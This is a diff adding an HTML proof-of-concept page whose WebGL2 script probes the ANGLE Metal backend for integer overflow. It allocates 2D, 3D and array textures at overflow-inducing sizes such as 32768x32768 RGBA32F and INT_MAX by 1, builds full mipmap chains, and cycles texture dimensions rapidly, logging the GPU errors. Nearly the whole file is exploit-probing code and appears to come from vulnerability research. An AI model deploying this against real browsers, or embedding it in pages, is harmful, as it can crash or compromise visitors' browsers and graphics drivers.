@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC1: Large Texture Dimensions - ANGLE Metal Integer Overflow</title></head>
+<body>
+<canvas id="c" width="1" height="1"></canvas>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  console.log('[POC1] ' + msg);
+}
+
+function getError(gl) {
+  const errs = [];
+  let e;
+  while ((e = gl.getError()) !== gl.NO_ERROR) errs.push('0x' + e.toString(16));
+  return errs.length ? errs.join(',') : 'none';
+}
+
+async function run() {
+  const canvas = document.getElementById('c');
+  const gl = canvas.getContext('webgl2');
+  if (!gl) { log('FAIL: No WebGL2'); return; }
+
+  log('Renderer: ' + gl.getParameter(gl.RENDERER));
+  log('Vendor: ' + gl.getParameter(gl.VENDOR));
+  log('Version: ' + gl.getParameter(gl.VERSION));
+
+  const maxTex = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+  log('MAX_TEXTURE_SIZE: ' + maxTex);
+
+  // Test 1: Maximum dimension RGBA32F texture
+  // Size calc: maxTex * maxTex * 4 * 4 bytes - can overflow if done in 32-bit
+  log('\n--- Test 1: Max dimension RGBA32F ---');
+  const tex1 = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, tex1);
+  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA32F, maxTex, maxTex, 0, gl.RGBA, gl.FLOAT, null);
+  log('Error after max RGBA32F: ' + getError(gl));
+  gl.deleteTexture(tex1);
+
+  // Test 2: Dimensions that cause 32-bit overflow in size calculation
+  // 32768 * 32768 * 16 (RGBA32F) = 17,179,869,184 which overflows int32
+  log('\n--- Test 2: Overflow-inducing dimensions ---');
+  const overflowSizes = [
+    [32768, 32768, gl.RGBA32F, gl.RGBA, gl.FLOAT, 'RGBA32F 32768x32768'],
+    [65536, 65536, gl.RGBA8, gl.RGBA, gl.UNSIGNED_BYTE, 'RGBA8 65536x65536'],
+    [16384, 16384, gl.RGBA32F, gl.RGBA, gl.FLOAT, 'RGBA32F 16384x16384'],
+    [maxTex, maxTex, gl.RGBA16F, gl.RGBA, gl.HALF_FLOAT, 'RGBA16F max x max'],
+    [0x7FFFFFFF, 1, gl.RGBA8, gl.RGBA, gl.UNSIGNED_BYTE, 'RGBA8 INT_MAX x 1'],
+    [0x10000, 0x10000, gl.RGBA8, gl.RGBA, gl.UNSIGNED_BYTE, 'RGBA8 65536x65536'],
+  ];
+
+  for (const [w, h, ifmt, fmt, type, desc] of overflowSizes) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    try {
+      gl.texImage2D(gl.TEXTURE_2D, 0, ifmt, w, h, 0, fmt, type, null);
+      log(desc + ': error=' + getError(gl));
+    } catch(e) {
+      log(desc + ': EXCEPTION: ' + e.message);
+    }
+    gl.deleteTexture(tex);
+  }
+
+  // Test 3: 3D textures - width * height * depth * bpp can overflow more easily
+  log('\n--- Test 3: Large 3D textures ---');
+  const max3d = gl.getParameter(gl.MAX_3D_TEXTURE_SIZE);
+  log('MAX_3D_TEXTURE_SIZE: ' + max3d);
+  
+  const tex3d = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_3D, tex3d);
+  gl.texImage3D(gl.TEXTURE_3D, 0, gl.RGBA32F, max3d, max3d, max3d, 0, gl.RGBA, gl.FLOAT, null);
+  log('3D RGBA32F max^3: error=' + getError(gl));
+  gl.deleteTexture(tex3d);
+
+  // Test 4: Texture array with many layers
+  log('\n--- Test 4: Large texture arrays ---');
+  const maxLayers = gl.getParameter(gl.MAX_ARRAY_TEXTURE_LAYERS);
+  log('MAX_ARRAY_TEXTURE_LAYERS: ' + maxLayers);
+  
+  const texArr = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D_ARRAY, texArr);
+  gl.texImage3D(gl.TEXTURE_2D_ARRAY, 0, gl.RGBA32F, maxTex, maxTex, maxLayers, 0, gl.RGBA, gl.FLOAT, null);
+  log('2D Array RGBA32F max x max x maxLayers: error=' + getError(gl));
+  gl.deleteTexture(texArr);
+
+  // Test 5: texStorage2D with mipmap levels - total size can overflow
+  log('\n--- Test 5: texStorage with full mipmap chain ---');
+  const texStor = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, texStor);
+  const levels = Math.floor(Math.log2(maxTex)) + 1;
+  log('Levels for maxTex: ' + levels);
+  gl.texStorage2D(gl.TEXTURE_2D, levels, gl.RGBA32F, maxTex, maxTex);
+  log('texStorage2D full chain: error=' + getError(gl));
+  gl.deleteTexture(texStor);
+
+  // Test 6: Rapid dimension changes to stress Metal backend
+  log('\n--- Test 6: Rapid texture dimension cycling ---');
+  const texCycle = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, texCycle);
+  for (let i = 0; i < 100; i++) {
+    const dim = (i % 2 === 0) ? maxTex : 1;
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, dim, dim, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+  }
+  log('Dimension cycling 100x: error=' + getError(gl));
+  gl.deleteTexture(texCycle);
+
+  log('\n=== PoC1 Complete ===');
+}
+
+run().catch(e => log('FATAL: ' + e.message + '\n' + e.stack));
+</script>
+</body>
+</html>
